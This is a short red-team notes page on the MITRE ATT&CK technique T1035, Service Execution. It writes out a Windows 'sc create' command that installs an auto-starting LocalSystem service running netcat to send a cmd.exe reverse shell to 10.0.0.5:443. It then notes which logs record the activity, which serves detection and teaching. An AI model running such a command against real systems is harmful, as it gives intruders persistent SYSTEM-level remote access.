---
description: 'Code Execution, Privilege Escalation'
---

# T1035: Service Execution

## Execution

Creating an evil service with an nc reverse shell:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```bash
C:\> sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
[SC] CreateService SUCCESS
C:\> sc start evilsvc
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Observations

The reverse shell lives under services.exe:

![](../.gitbook/assets/services-nc.png)

Windows security, application, Service Control Manager and sysmon logs provide some juicy details:

![](../.gitbook/assets/services-logs.png)

![](../.gitbook/assets/services-shell.png)

{% embed url="https://attack.mitre.org/wiki/Technique/T1035" %}

